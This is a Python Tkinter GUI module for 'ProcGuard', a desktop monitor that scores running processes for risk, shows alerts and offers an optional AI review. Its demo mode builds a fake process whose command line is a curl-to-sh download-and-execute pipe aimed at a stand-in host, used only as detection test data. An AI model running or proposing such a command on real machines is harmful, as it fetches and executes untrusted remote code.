"""Tkinter GUI. Tkinter ships with Python on Windows/macOS/Linux, so the only
hard dependency of the whole project is psutil."""
from __future__ import annotations

import queue
import sys
import threading
import time
import tkinter as tk
from tkinter import font as tkfont
from tkinter import messagebox, ttk
from typing import Dict, List, Optional

import psutil

from .ai_analyzer import AIReviewer, AIVerdict, ai_key, default_analyzer
from .alerts import AlertManager, notify
from .collector import Collector
from .models import Assessed, Level
from .risk_engine import RiskEngine, is_external, trust_key
from .storage import load_trusted, save_trusted
from .util import fmt_age, fmt_bytes, fmt_time

# level -> (row text colour, row background, label, strong bg, strong fg)
STYLE = {
    Level.HIGH: ("#7a1010", "#fdd9d7", "HIGH RISK", "#d92d20", "#ffffff"),
    Level.MEDIUM: ("#6b4200", "#fdebc8", "MEDIUM RISK", "#f79009", "#1a1a1a"),
    Level.LOW: ("#0b5a2c", "#d9f3e1", "LOW RISK", "#12b76a", "#ffffff"),
}
GROUP = {Level.HIGH: "grp_high", Level.MEDIUM: "grp_medium", Level.LOW: "grp_low"}
VERDICT_COLOURS = {"benign": "#12b76a", "suspicious": "#f79009", "malicious": "#d92d20",
                   "unknown": "#6b7280", "error": "#6b7280"}

COLUMNS = (  # id, heading, width, anchor
    ("pid", "PID", 70, "e"),
    ("cpu", "CPU %", 70, "e"),
    ("mem", "Memory", 90, "e"),
    ("score", "Score", 60, "e"),
    ("user", "User", 120, "w"),
    ("reason", "Main reason", 520, "w"),
)
SORTERS = {
    "#0": lambda a: a.info.name.lower(),
    "pid": lambda a: a.info.pid,
    "cpu": lambda a: a.info.cpu_percent,
    "mem": lambda a: a.info.mem_rss,
    "score": lambda a: a.risk.score,
    "user": lambda a: (a.info.username or "").lower(),
}
INTERVALS = {"1 s": 1.0, "2 s": 2.0, "5 s": 5.0, "10 s": 10.0}


class App(tk.Tk):
    def __init__(self, demo: bool = False) -> None:
        super().__init__()
        self.title("ProcGuard \u2014 process risk monitor")
        self.geometry("1200x780")
        self.minsize(920, 560)

        # --- core objects
        self.trusted = load_trusted()
        self.engine = RiskEngine(self.trusted)
        if demo:
            self._enable_demo()
        self.collector = Collector()
        self.alert_mgr = AlertManager()
        self.analyzer = default_analyzer()
        self.reviewer = AIReviewer(self.analyzer, lambda k, v: self.q.put(("ai", k, v)))
        self.ai_results: Dict[str, object] = {}
        self._ai_consented = False

        # --- state shared with the worker thread
        self.q: "queue.Queue" = queue.Queue()
        self._wake = threading.Event()
        self._stop = threading.Event()
        self._paused = False
        self._interval = 2.0

        # --- UI state
        self.items: Dict[int, Assessed] = {}
        self._sort = ("score", True)
        self._last_sig = ""
        self._last_pid: Optional[int] = None
        self._banner_pid: Optional[int] = None

        self._build_fonts_and_style()
        self._build_ui()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

        threading.Thread(target=self._worker, daemon=True).start()
        self.after(200, self._poll)

    # ================================================================== setup
    def _build_fonts_and_style(self) -> None:
        base = tkfont.nametofont("TkDefaultFont")
        self.f_base = base
        self.f_bold = base.copy()
        self.f_bold.configure(weight="bold")
        self.f_big = base.copy()
        self.f_big.configure(weight="bold", size=base.cget("size") + 5)
        self.f_mono = tkfont.nametofont("TkFixedFont").copy()
        style = ttk.Style(self)
        if sys.platform.startswith("linux"):
            try:
                style.theme_use("clam")
            except tk.TclError:
                pass
        style.configure("Treeview", rowheight=int(base.cget("size") * 2.1) + 4)

    def _build_ui(self) -> None:
        # ---------------- top bar
        self.topbar = ttk.Frame(self, padding=(10, 8))
        self.topbar.pack(fill="x")
        self.badges: Dict[Level, tk.Label] = {}
        for lvl in (Level.HIGH, Level.MEDIUM, Level.LOW):
            st = STYLE[lvl]
            lbl = tk.Label(self.topbar, text=f"{st[2].split()[0]}  0", bg=st[3], fg=st[4],
                           font=self.f_bold, padx=12, pady=4)
            lbl.pack(side="left", padx=(0, 6))
            self.badges[lvl] = lbl

        ttk.Label(self.topbar, text="Search:").pack(side="left", padx=(14, 4))
        self.search_var = tk.StringVar()
        self.search_var.trace_add("write", lambda *_: self._apply_tree())
        ttk.Entry(self.topbar, textvariable=self.search_var, width=22).pack(side="left")

        ttk.Label(self.topbar, text="Refresh:").pack(side="left", padx=(14, 4))
        self.interval_box = ttk.Combobox(self.topbar, values=list(INTERVALS), width=5,
                                         state="readonly")
        self.interval_box.set("2 s")
        self.interval_box.bind("<<ComboboxSelected>>", self._on_interval)
        self.interval_box.pack(side="left")

        self.pause_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(self.topbar, text="Pause", variable=self.pause_var,
                        command=self._on_pause).pack(side="left", padx=(12, 0))
        ttk.Button(self.topbar, text="Refresh now", command=self._wake.set).pack(side="left", padx=8)

        self.alerts_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(self.topbar, text="Alerts", variable=self.alerts_var).pack(side="left")

        self.auto_ai = tk.BooleanVar(value=False)
        self.ai_check = ttk.Checkbutton(self.topbar, text="AI auto-review", variable=self.auto_ai,
                                        command=self._on_auto_ai)
        self.ai_check.pack(side="left", padx=(12, 0))
        if not self.analyzer.available():
            self.ai_check.state(["disabled"])

        # ---------------- alert banner (hidden until needed)
        self.banner = tk.Frame(self, bg="#d92d20")
        self.banner_label = tk.Label(self.banner, text="", bg="#d92d20", fg="white",
                                     font=self.f_bold, anchor="w", cursor="hand2")
        self.banner_label.pack(side="left", fill="x", expand=True, padx=10, pady=6)
        self.banner_label.bind("<Button-1>", lambda _e: self._focus_pid(self._banner_pid))
        tk.Button(self.banner, text="Dismiss", command=self.banner.pack_forget,
                  highlightbackground="#d92d20").pack(side="right", padx=8, pady=4)

        # ---------------- status bar (packed first so it stays at the bottom)
        self.status = ttk.Label(self, text="Starting\u2026", padding=(10, 4), anchor="w")
        self.status.pack(side="bottom", fill="x")

        # ---------------- main split: tree on top, inspector below
        paned = ttk.PanedWindow(self, orient="vertical")
        paned.pack(fill="both", expand=True)

        tree_frame = ttk.Frame(paned)
        self.tree = ttk.Treeview(tree_frame, columns=[c[0] for c in COLUMNS],
                                 selectmode="browse")
        vs = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=vs.set)
        self.tree.pack(side="left", fill="both", expand=True)
        vs.pack(side="right", fill="y")
        self.tree.column("#0", width=260, anchor="w")
        self._set_headings()
        for cid, _h, width, anchor in COLUMNS:
            self.tree.column(cid, width=width, anchor=anchor, stretch=(cid == "reason"))
        for lvl, st in STYLE.items():
            if lvl is not Level.LOW:  # Low rows keep the theme's normal colours
                self.tree.tag_configure(lvl.value, foreground=st[0], background=st[1])
            self.tree.tag_configure("g_" + lvl.value, foreground=st[4], background=st[3],
                                    font=self.f_bold)
            self.tree.insert("", "end", iid=GROUP[lvl], text=f"{st[2]}", open=(lvl is not Level.LOW),
                             tags=("g_" + lvl.value,))
        self.tree.bind("<<TreeviewSelect>>", lambda _e: self._show_inspector())
        paned.add(tree_frame, weight=3)

        nb = ttk.Notebook(paned)
        paned.add(nb, weight=2)

        insp = ttk.Frame(nb)
        nb.add(insp, text="Inspector")
        bar = ttk.Frame(insp, padding=(8, 6))
        bar.pack(fill="x")
        self.btn_ai = ttk.Button(bar, text="Ask AI about this", command=self._ask_ai)
        self.btn_ai.pack(side="left")
        self.btn_trust = ttk.Button(bar, text="Mark as trusted", command=self._toggle_trust)
        self.btn_trust.pack(side="left", padx=6)
        self.btn_kill = ttk.Button(bar, text="Terminate process\u2026", command=self._terminate)
        self.btn_kill.pack(side="left")
        body = ttk.Frame(insp)
        body.pack(fill="both", expand=True)
        self.detail = tk.Text(body, wrap="word", padx=12, pady=8, borderwidth=0, state="disabled",
                              height=10, font=self.f_base)
        ds = ttk.Scrollbar(body, orient="vertical", command=self.detail.yview)
        self.detail.configure(yscrollcommand=ds.set)
        self.detail.pack(side="left", fill="both", expand=True)
        ds.pack(side="right", fill="y")
        self._configure_detail_tags()

        logf = ttk.Frame(nb)
        nb.add(logf, text="Alert log")
        self.log = tk.Text(logf, wrap="word", padx=12, pady=8, borderwidth=0, state="disabled",
                           height=8, font=self.f_base)
        ls = ttk.Scrollbar(logf, orient="vertical", command=self.log.yview)
        self.log.configure(yscrollcommand=ls.set)
        self.log.pack(side="left", fill="both", expand=True)
        ls.pack(side="right", fill="y")
        self.log.tag_configure("time", foreground="#6b7280")
        self.log.tag_configure("alert", font=self.f_bold, foreground="#d92d20")

        self._show_inspector(force=True)

    def _configure_detail_tags(self) -> None:
        t = self.detail
        t.tag_configure("h1", font=self.f_big)
        t.tag_configure("h2", font=self.f_bold, spacing1=10, spacing3=2)
        t.tag_configure("muted", foreground="#8a8f98")
        t.tag_configure("pts", font=self.f_mono, foreground="#d92d20")
        t.tag_configure("body", lmargin1=0, lmargin2=0)
        t.tag_configure("mono", font=self.f_mono)
        for lvl, st in STYLE.items():
            t.tag_configure(lvl.value, font=self.f_bold, background=st[3], foreground=st[4])
        for v, colour in VERDICT_COLOURS.items():
            t.tag_configure("v_" + v, font=self.f_bold, foreground=colour)

    def _set_headings(self) -> None:
        col, rev = self._sort
        arrow = " \u25BC" if rev else " \u25B2"
        self.tree.heading("#0", text="Process" + (arrow if col == "#0" else ""),
                          command=lambda: self._sort_by("#0"))
        for cid, head, _w, _a in COLUMNS:
            if cid in SORTERS:
                self.tree.heading(cid, text=head + (arrow if col == cid else ""),
                                  command=lambda c=cid: self._sort_by(c))
            else:
                self.tree.heading(cid, text=head)

    def _enable_demo(self) -> None:
        """--demo-alerts: after two normal scans, a SIMULATED high-risk process appears so you can
        see the banner, alert log and notification. It is not a real process and runs nothing."""
        from .models import ProcessInfo

        orig = self.engine.assess_all
        started = time.time()  # fixed start time = stable identity, so it alerts exactly once
        scans = {"n": 0}

        def wrapped(infos):
            scans["n"] += 1
            out = orig(infos)
            if scans["n"] >= 3:
                fake = ProcessInfo(
                    pid=999001, ppid=1, name="demo_dropper (simulated)",
                    exe="/tmp/demo/demo_dropper",
                    cmdline=["sh", "-c", "curl http://example.invalid/payload.sh | sh"],
                    username="demo", create_time=started, status="running", num_threads=2,
                    cpu_percent=5.0, mem_percent=0.5, mem_rss=40_000_000, parent_name="demo")
                out = out + orig([fake])
            return out

        self.engine.assess_all = wrapped

    # ============================================================ worker thread
    def _worker(self) -> None:
        force = False
        while not self._stop.is_set():
            if force or not self._paused:
                try:
                    self.q.put(("snap", self.engine.assess_all(self.collector.snapshot())))
                except Exception as exc:  # keep the monitor alive no matter what
                    self.q.put(("error", f"{type(exc).__name__}: {exc}"))
            force = self._wake.wait(self._interval)
            self._wake.clear()

    def _poll(self) -> None:
        latest = None
        try:
            while True:
                msg = self.q.get_nowait()
                if msg[0] == "snap":
                    latest = msg[1]  # only the newest snapshot matters
                elif msg[0] == "ai":
                    self._on_ai(msg[1], msg[2])
                elif msg[0] == "error":
                    self.status.config(text=f"Scan error: {msg[1]}")
        except queue.Empty:
            pass
        if latest is not None:
            self._on_snapshot(latest)
        self.after(250, self._poll)

    # ============================================================== event logic
    def _on_snapshot(self, assessed: List[Assessed]) -> None:
        self.items = {a.info.pid: a for a in assessed}
        counts = {lvl: 0 for lvl in Level}
        for a in assessed:
            counts[a.risk.level] += 1
        for lvl, lbl in self.badges.items():
            lbl.config(text=f"{STYLE[lvl][2].split()[0]}  {counts[lvl]}")

        new, first = self.alert_mgr.update(assessed)
        if self.alerts_var.get() and new:
            if first:
                names = ", ".join(sorted({a.info.name for a in new})[:4])
                self._raise_alert("Startup scan", f"{len(new)} high-risk process(es) already running: "
                                  f"{names}", new[0].info.pid)
            else:
                for a in new[:3]:
                    top = max(a.risk.reasons, key=lambda r: r.points)
                    self._raise_alert(f"New high-risk process: {a.info.name}",
                                      top.text.split(". ")[0], a.info.pid)
                if len(new) > 3:
                    self._raise_alert("Multiple new high-risk processes", f"{len(new) - 3} more", None)

        if self.auto_ai.get():
            ranked = sorted((a for a in assessed if a.risk.level is not Level.LOW),
                            key=lambda a: -a.risk.score)
            for a in ranked:
                if ai_key(a.info) not in self.ai_results and self.reviewer.submit(a.info, a.risk):
                    self.ai_results[ai_key(a.info)] = "pending"

        self._apply_tree()
        self._show_inspector()
        ai = f"AI: {self.analyzer.name}" if self.analyzer.available() else "AI: off"
        self.status.config(text=f"{len(assessed)} processes  \u00b7  updated "
                                f"{time.strftime('%H:%M:%S')}  \u00b7  {ai}")

    def _on_ai(self, key: str, verdict: AIVerdict) -> None:
        self.ai_results[key] = verdict
        if verdict.verdict in ("suspicious", "malicious") and self.alerts_var.get():
            pid = next((p for p, a in self.items.items() if ai_key(a.info) == key), None)
            self._raise_alert(f"AI says {verdict.verdict}: {verdict.subject}",
                              verdict.explanation[:200], pid)
        self._show_inspector()

    def _raise_alert(self, title: str, message: str, pid: Optional[int]) -> None:
        self._banner_pid = pid
        line = f"{title} \u2014 {message}"
        if len(line) > 150:
            line = line[:149] + "\u2026"
        self.banner_label.config(text=f"\u26A0  {line}")
        self.banner.pack(fill="x", after=self.topbar)
        notify("ProcGuard: " + title, message)
        self.log.config(state="normal")
        self.log.insert("1.0", f"{message}\n", "")
        self.log.insert("1.0", f"{title}\n", "alert")
        self.log.insert("1.0", f"[{time.strftime('%H:%M:%S')}]  ", "time")
        self.log.config(state="disabled")

    # ================================================================ tree view
    def _haystack(self, a: Assessed) -> str:
        i = a.info
        return f"{i.name} {i.pid} {i.exe or ''} {i.username or ''} {i.cmd}".lower()

    @staticmethod
    def _top_reason(a: Assessed) -> str:
        pos = [r for r in a.risk.reasons if r.points > 0]
        if not pos:
            return "\u2014"
        text = max(pos, key=lambda r: r.points).text
        first = text.split(". ")[0].rstrip(".")
        return first if len(first) <= 140 else first[:137] + "\u2026"

    def _apply_tree(self) -> None:
        if not self.items:
            return
        q = self.search_var.get().strip().lower()
        col, rev = self._sort
        keyf = SORTERS[col]
        buckets: Dict[Level, List[Assessed]] = {lvl: [] for lvl in Level}
        for a in self.items.values():
            if not q or q in self._haystack(a):
                buckets[a.risk.level].append(a)

        keep = set()
        for lvl in (Level.HIGH, Level.MEDIUM, Level.LOW):
            rows = sorted(buckets[lvl], key=lambda a: (a.info.name.lower(), a.info.pid))
            rows.sort(key=keyf, reverse=rev)  # stable: ties keep name/pid order
            parent = GROUP[lvl]
            for idx, a in enumerate(rows):
                i = a.info
                iid = f"p{i.pid}"
                keep.add(iid)
                vals = (i.pid, f"{i.cpu_percent:.1f}", fmt_bytes(i.mem_rss), a.risk.score,
                        i.username or "\u2014", self._top_reason(a))
                if self.tree.exists(iid):
                    self.tree.item(iid, text=i.name, values=vals, tags=(lvl.value,))
                    if self.tree.parent(iid) != parent or self.tree.index(iid) != idx:
                        self.tree.move(iid, parent, idx)
                else:
                    self.tree.insert(parent, idx, iid=iid, text=i.name, values=vals,
                                     tags=(lvl.value,))
            n = len(rows)
            self.tree.item(parent, text=f"{STYLE[lvl][2]}   \u00b7   {n} process"
                                        f"{'' if n == 1 else 'es'}")
        for grp in GROUP.values():
            for iid in self.tree.get_children(grp):
                if iid not in keep:
                    self.tree.delete(iid)

    def _sort_by(self, col: str) -> None:
        cur, rev = self._sort
        self._sort = (col, not rev) if col == cur else (col, col in ("cpu", "mem", "score"))
        self._set_headings()
        self._apply_tree()

    def _focus_pid(self, pid: Optional[int]) -> None:
        iid = f"p{pid}"
        if pid is not None and self.tree.exists(iid):
            self.tree.item(self.tree.parent(iid), open=True)
            self.tree.selection_set(iid)
            self.tree.see(iid)

    # ================================================================ inspector
    def _selected(self) -> Optional[Assessed]:
        sel = self.tree.selection()
        if sel and sel[0].startswith("p"):
            try:
                return self.items.get(int(sel[0][1:]))
            except ValueError:
                return None
        return None

    def _segments(self, a: Assessed) -> List[tuple]:
        i, r = a.info, a.risk
        s: List[tuple] = []
        s += [(i.name, "h1"), (f"    PID {i.pid}\n", "muted")]
        s += [(f" {STYLE[r.level][2]}  \u00b7  score {r.score} ", r.level.value), ("\n", "body")]

        s.append(("Why it was flagged\n", "h2"))
        pos = sorted((x for x in r.reasons if x.points > 0), key=lambda x: -x.points)
        for x in pos:
            s += [(f"+{x.points:<4}", "pts"), (f"{x.text}\n", "body")]
        for x in (x for x in r.reasons if x.points == 0):
            s.append((f"{x.text}\n", "muted"))
        if not r.reasons:
            s.append(("Nothing unusual was detected.\n", "muted"))

        s += [("What it is probably doing\n", "h2"), (r.description + "\n", "body")]

        s.append(("AI second opinion\n", "h2"))
        res = self.ai_results.get(ai_key(i))
        if res == "pending":
            s.append((f"Asking {self.analyzer.name}\u2026\n", "muted"))
        elif isinstance(res, AIVerdict):
            s += [(f"Verdict: {res.verdict.upper()}\n", "v_" + res.verdict),
                  (res.explanation + "\n", "body")]
        elif not self.analyzer.available():
            s.append(("Not configured. Set GEMINI_API_KEY and `pip install google-genai` "
                      "(see README).\n", "muted"))
        else:
            s.append(("Click \u201cAsk AI about this\u201d for a second opinion.\n", "muted"))

        s.append(("Details\n", "h2"))

        def row(label: str, value: str) -> None:
            s.extend([(f"{label:<13}", "muted"), (value + "\n", "mono")])

        row("Path", i.exe or "(hidden \u2014 permission denied)")
        row("Command", i.cmd or "(hidden or none)")
        row("User", i.username or "unknown")
        row("Parent", f"{i.parent_name or 'unknown'} (PID {i.ppid})")
        row("Started", f"{fmt_time(i.create_time)}  ({fmt_age(i.create_time)} ago)")
        row("Status", i.status or "unknown")
        row("CPU / Memory", f"{i.cpu_percent:.1f}% of machine / {fmt_bytes(i.mem_rss)} "
                            f"({i.mem_percent:.1f}%)")
        row("Threads", str(i.num_threads))
        if i.remote:
            shown = [f"{ip}:{port}" + ("  (internet)" if is_external(ip) else "")
                     for ip, port in i.remote[:8]]
            more = f"  \u2026and {len(i.remote) - 8} more" if len(i.remote) > 8 else ""
            row("Connections", "\n             ".join(shown) + more)
        else:
            row("Connections", "none seen (or not visible to this app)")
        if i.listening:
            row("Listening", ", ".join(sorted({f"{ip}:{p}" for ip, p in i.listening})[:8]))
        return s

    def _show_inspector(self, force: bool = False) -> None:
        a = self._selected()
        if a is None:
            segs = [("Select a process above to see why it was flagged and what it is doing.\n",
                     "muted")]
        else:
            segs = self._segments(a)
        sig = "".join(t for t, _ in segs) + ("T" if a and trust_key(a.info) in self.trusted else "")
        pid = a.info.pid if a else None
        if not force and sig == self._last_sig:
            return
        # Don't yank the text away while the user is selecting something to copy.
        if not force and pid == self._last_pid and self.detail.tag_ranges("sel"):
            return
        y = self.detail.yview()[0] if pid == self._last_pid else 0.0
        self.detail.config(state="normal")
        self.detail.delete("1.0", "end")
        for text, tag in segs:
            self.detail.insert("end", text, tag)
        self.detail.config(state="disabled")
        self.detail.yview_moveto(y)
        self._last_sig, self._last_pid = sig, pid
        self._update_buttons(a)

    def _update_buttons(self, a: Optional[Assessed]) -> None:
        on = a is not None
        self.btn_kill.state(["!disabled"] if on and a.info.pid != self._own_pid() else ["disabled"])
        self.btn_trust.state(["!disabled"] if on else ["disabled"])
        self.btn_ai.state(["!disabled"] if on and self.analyzer.available() else ["disabled"])
        if on:
            self.btn_trust.config(text="Remove trust" if trust_key(a.info) in self.trusted
                                  else "Mark as trusted")

    @staticmethod
    def _own_pid() -> int:
        import os
        return os.getpid()

    # ================================================================== actions
    def _confirm_ai(self) -> bool:
        if self._ai_consented:
            return True
        ok = messagebox.askokcancel(
            "Send data to AI?",
            f"AI review sends a REDACTED summary of a process to {self.analyzer.name}'s API: its "
            "name, file path, command line, parent name, internet IP:ports, and why it was flagged. "
            "Your username and home folder are masked and obvious secrets are removed, but redaction "
            "is not perfect.\n\nOnly Medium/High processes you ask about (or auto-review picks) are "
            "sent, never the full process list.\n\nContinue?")
        self._ai_consented = bool(ok)
        return self._ai_consented

    def _on_auto_ai(self) -> None:
        if self.auto_ai.get() and not self._confirm_ai():
            self.auto_ai.set(False)

    def _ask_ai(self) -> None:
        a = self._selected()
        if a is None or not self._confirm_ai():
            return
        key = ai_key(a.info)
        self.ai_results[key] = "pending"
        if not self.reviewer.submit(a.info, a.risk, force=True):
            self.ai_results[key] = AIVerdict("error", "Could not queue the request (queue full "
                                             "or AI not configured).", a.info.name)
        self._show_inspector(force=True)

    def _toggle_trust(self) -> None:
        a = self._selected()
        if a is None:
            return
        k = trust_key(a.info)
        if k in self.trusted:
            self.trusted.discard(k)
        else:
            self.trusted.add(k)
        save_trusted(self.trusted)
        self._wake.set()

    def _terminate(self) -> None:
        a = self._selected()
        if a is None:
            return
        if not messagebox.askyesno(
                "Terminate process",
                f"End \u201c{a.info.name}\u201d (PID {a.info.pid})?\n\nUnsaved work in it will be lost, "
                "and ending a system process can make your computer unstable.",
                icon="warning", default="no"):
            return
        try:
            p = psutil.Process(a.info.pid)
            if a.info.create_time and abs(p.create_time() - a.info.create_time) > 1:
                messagebox.showinfo("Already gone", "That process already exited and its ID was "
                                    "reused, so nothing was ended.")
                return
            p.terminate()
        except psutil.NoSuchProcess:
            pass
        except psutil.AccessDenied:
            messagebox.showerror("Permission denied", "You don't have permission to end that "
                                 "process. Running ProcGuard as administrator/root may allow it.")
        except Exception as exc:
            messagebox.showerror("Could not terminate", str(exc))
        self._wake.set()

    def _on_pause(self) -> None:
        self._paused = self.pause_var.get()

    def _on_interval(self, _e=None) -> None:
        self._interval = INTERVALS.get(self.interval_box.get(), 2.0)
        self._wake.set()

    def _on_close(self) -> None:
        self._stop.set()
        self._wake.set()
        self.destroy()


def run(demo: bool = False) -> None:
    App(demo=demo).mainloop()
